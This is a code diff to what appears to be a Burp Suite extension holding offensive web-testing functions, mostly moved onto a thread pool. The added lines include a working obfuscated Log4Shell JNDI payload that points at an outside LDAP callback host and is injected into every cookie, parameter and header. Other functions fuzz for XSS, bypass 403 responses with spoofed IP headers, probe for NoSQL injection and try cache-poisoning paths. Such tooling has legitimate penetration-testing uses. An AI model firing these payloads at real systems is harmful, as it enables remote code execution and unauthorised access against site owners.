@@ -18,31 +18,30 @@ def jsonUnicodeEscape(selectedText):
     return json.dumps(json_object, ensure_ascii=False, indent=2)
 
 
-# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
-# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
-# the main thread can continue executing other tasks without being blocked.
-@run_in_thread
 def log4shell(request):
-    payload = "log4shell payload"
-    sendRequest(modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
-    sendRequest(modifyAllParamsValue(request, payload))
+    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"
+    pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
+    pool.run(sendRequest, modifyAllParamsValue(request, payload))
     for header in request.headers():
-        if header.name().lower() not in ["cookie", "host"]:
+        if header.name().lower() not in ["cookie", "host","content-length"]:
             request = request.withHeader(header.name(), payload)
-    sendRequest(request)
+    pool.run(sendRequest, request)
 
 
 def fuzzParamPerRequest(request):
     payload = "'\">"
     if request.contentType() == ContentType.JSON:
         for item in traverse_and_modify(json.loads(request.bodyToString().encode()), payload):
-            pool.sendRequest(request.withBody(json.dumps(item)))
+            pool.run(sendRequest, request.withBody(json.dumps(item)))
     for param in request.parameters():
         if param.type() == HttpParameterType.JSON:
             continue
-        pool.sendRequest(request.withParameter(parameter(param.name(), param.value() + payload, param.type())))
+        pool.run(sendRequest, request.withParameter(parameter(param.name(), param.value() + payload, param.type())))
 
 
+# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
+# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
+# the main thread can continue executing other tasks without being blocked.
 @run_in_thread
 def fuzzParamsOneRequest(request):
     payload = "'\">"
@@ -52,24 +51,14 @@ def fuzzParamsOneRequest(request):
 def bypass403(editor, request):
     ip = "127.0.0.1"
     editor.setRequest(request.withHeader("X-Forwarded-For", ip). \
-        withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip). \
-        withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip). \
-        withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip)
-    )
+                      withHeader("X-Originating-IP", ip).withHeader("X-Remote-IP", ip). \
+                      withHeader("X-Remote-Addr", ip).withHeader("X-Real-IP", ip). \
+                      withHeader("X-Forwarded-Host", ip).withHeader("X-Client-IP", ip).withHeader("X-Host", ip)
+                      )
 
-
-def noSqliScan(request):
-    if request.body().length() > 6 and request.contentType() == ContentType.JSON:
-        for payload in traverse_and_modify(json.loads(request.bodyToString().encode()), {"$83b3j45b": "xxx"}):
-            pool.sendRequest(request.withBody(json.dumps(payload)), noSqliScanCallBack)
-    for param in request.parameters():
-        paramType = param.type()
-        if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
-            pool.sendRequest(request.withRemovedParameters(param).withParameter(
-                parameter(param.name() + "[$83b3j45b]", param.value(), paramType)), noSqliScanCallBack)
-
-
-def noSqliScanCallBack(requestResponse):
+@run_in_pool(pool)
+def no_sql_request(request):
+    requestResponse = sendRequest(request)
     body = requestResponse.response().bodyToString()
     for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
         if highlight in body:
@@ -77,6 +66,16 @@ def noSqliScanCallBack(requestResponse):
                      AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                      "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight)))
             break
+
+def noSqliScan(request):
+    if request.body().length() > 6 and request.contentType() == ContentType.JSON:
+        for payload in traverse_and_modify(json.loads(request.bodyToString().encode()), {"$83b3j45b": "xxx"}):
+            no_sql_request(request.withBody(json.dumps(payload)))
+    for param in request.parameters():
+        paramType = param.type()
+        if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
+            #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
+            no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
 
 
 def insertAtCursor():
@@ -112,7 +111,7 @@ def finish():
 def cachePoison(request):
     for payload in ["%0d.css", "%0a.png", "%0a.json", "%0d.png", "%00.png", "%0d%0a.png"]:
         originPath = request.path()
-        pool.sendRequest(request.withPath(originPath + payload))
+        pool.run(sendRequest, request.withPath(originPath + payload))
 
 
 # This code snippet is generated by OpenAI's ChatGPT language model.
